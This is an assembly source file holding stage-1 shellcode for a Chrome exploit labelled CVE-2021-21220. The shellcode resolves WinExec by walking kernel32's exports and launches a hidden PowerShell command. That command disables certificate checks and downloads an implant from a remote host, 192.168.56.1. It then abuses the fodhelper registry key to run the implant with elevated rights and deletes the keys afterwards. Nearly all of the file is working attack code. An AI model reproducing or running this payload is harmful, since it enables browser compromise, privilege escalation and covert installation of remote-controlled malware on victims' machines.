BITS 64

; ──────────────────────────────────────────────────────────────────────────────
;  CVE-2021-21220  Stage 1 — in-place x64 WinExec shellcode
;
;  Runs directly on the RWX WASM page — no VirtualAlloc, no PE loader,
;  no Donut wrapper.  Chrome's sandbox does not restrict any API used here.
;
;  Flow:
;    PEB → Ldr → kernel32 base
;    PE export table → WinExec address
;    jmp/call/pop to get embedded command string address
;    WinExec(cmd, SW_HIDE=0)
;
;  192.168.56.1 is substituted by the Makefile (via sed) before assembling.
; ──────────────────────────────────────────────────────────────────────────────

section .text
global _start

_start:
    ; Align stack to 16 bytes — alignment at V8 JIT entry is unknown
    and  rsp, 0xFFFFFFFFFFFFFFF0
    sub  rsp, 0x20              ; 32-byte shadow space; keeps RSP 16-aligned for WinExec call

    ; ── Locate kernel32.dll base via PEB.Ldr ─────────────────────────────────
    ;  GS:[0x60]       → PEB
    ;  PEB  + 0x18     → PEB.Ldr
    ;  Ldr  + 0x20     → InMemoryOrderModuleList.Flink (→ exe entry)
    ;  [Flink]         → ntdll entry
    ;  [[Flink]]       → kernel32 entry
    ;  entry + 0x20    → DllBase  (InMemoryOrderLinks base + 0x20)
    mov  rax, [gs:0x60]
    mov  rax, [rax + 0x18]
    mov  rax, [rax + 0x20]
    mov  rax, [rax]
    mov  rax, [rax]
    mov  rbx, [rax + 0x20]     ; kernel32 DllBase

    ; ── Walk kernel32 PE export table ────────────────────────────────────────
    ;  NT headers:         rbx + [rbx+0x3C]
    ;  ExportDir RVA:      NtHdr + 0x88  (OptHdr at +0x18, DataDir[0].VA at +0x70)
    ;  EXPORT_DIRECTORY:
    ;    +0x18  NumberOfNames
    ;    +0x1C  AddressOfFunctions RVA
    ;    +0x20  AddressOfNames RVA
    ;    +0x24  AddressOfNameOrdinals RVA
    mov  eax, [rbx + 0x3C]
    add  rax, rbx
    mov  edx, [rax + 0x88]
    add  rdx, rbx              ; ExportDirectory VA

    mov  r8d,  [rdx + 0x18]   ; NumberOfNames
    mov  r9d,  [rdx + 0x20]   ; AddressOfNames RVA → VA
    add  r9,   rbx
    mov  r10d, [rdx + 0x24]   ; AddressOfNameOrdinals RVA → VA
    add  r10,  rbx
    mov  r11d, [rdx + 0x1C]   ; AddressOfFunctions RVA → VA
    add  r11,  rbx

    ; ── Find "WinExec\0" ─────────────────────────────────────────────────────
    ;  Little-endian qword for "WinExec\0":
    ;    W=57 i=69 n=6E E=45 x=78 e=65 c=63 \0=00  →  0x00636578456E6957
    xor  rcx, rcx
.search:
    cmp  rcx, r8
    jge  .done
    mov  eax, [r9 + rcx*4]
    add  rax, rbx
    mov  rdi, 0x00636578456E6957
    cmp  qword [rax], rdi
    je   .found
    inc  rcx
    jmp  .search

.found:
    movzx eax, word [r10 + rcx*2]  ; name ordinal
    mov   eax, [r11 + rax*4]       ; function RVA
    add   rax, rbx                 ; WinExec VA
    mov   r12, rax

    ; ── Call WinExec via jmp/call/pop to get cmd address ─────────────────────
    jmp  .getstr

.exec:
    pop  rcx                   ; RCX = &cmd  (return addr pushed by call .exec)
    xor  rdx, rdx              ; RDX = 0 (SW_HIDE)
    call r12                   ; WinExec(cmd, 0)
    ; fall through

.done:
    add  rsp, 0x28
    ret

.getstr:
    call .exec                 ; pushes &cmd, then jumps to .exec

; ── Command string ────────────────────────────────────────────────────────────
;  Builds: powershell -w h -nop -c "<download + fodhelper UAC bypass>"
;
;  Flow:
;    1. Download implant to C:\Users\Public\i.exe
;    2. Write HKCU ms-settings\shell\open\command → i.exe  (fodhelper registry key)
;    3. Set DelegateExecute = "" (triggers auto-elevation lookup)
;    4. Start fodhelper.exe  (whitelisted auto-elevate binary; reads key, runs i.exe as admin)
;    5. Sleep 3s so fodhelper fires before registry cleanup
;    6. Remove the registry key (cleanup)
;
;  0x22 = "   0x27 = '   0x00 = null terminator
;  No null bytes within the string — only the final 0x00 terminates it.
; Section 9: HTTPS delivery with single-use token + self-signed cert bypass.
; [Net.ServicePointManager]::ServerCertificateValidationCallback={$true} bypasses
; certificate validation for the self-signed nginx cert (self-signed because we
; have no registered domain).  The bypass is intentional and scoped to this
; PowerShell process only.
cmd:
    db 'powershell -w h -nop -c ', 0x22
    db '[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};'
    db '[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;'
    db '(New-Object Net.WebClient).DownloadFile('
    db 0x27, 'https://192.168.56.1/update/b37accecdcff76000b5af677d4def68a932d1bb36f49daedc08829f61ee3fd9f', 0x27
    db ','
    db 0x27, 'C:\Users\Public\i.exe', 0x27
    db ');'
    db 'New-Item -Force -Path '
    db 0x27, 'HKCU:\Software\Classes\ms-settings\shell\open\command', 0x27
    db ' -Value '
    db 0x27, 'C:\Users\Public\i.exe', 0x27
    db ';'
    db 'New-ItemProperty -Force -Path '
    db 0x27, 'HKCU:\Software\Classes\ms-settings\shell\open\command', 0x27
    db ' -Name DelegateExecute -Value '
    db 0x27, 0x27                   ; empty string — required to trigger auto-elevation
    db ';Start-Process fodhelper.exe;Start-Sleep 3;'
    db 'Remove-Item -Force -Recurse '
    db 0x27, 'HKCU:\Software\Classes\ms-settings', 0x27
    db 0x22
    db 0x00
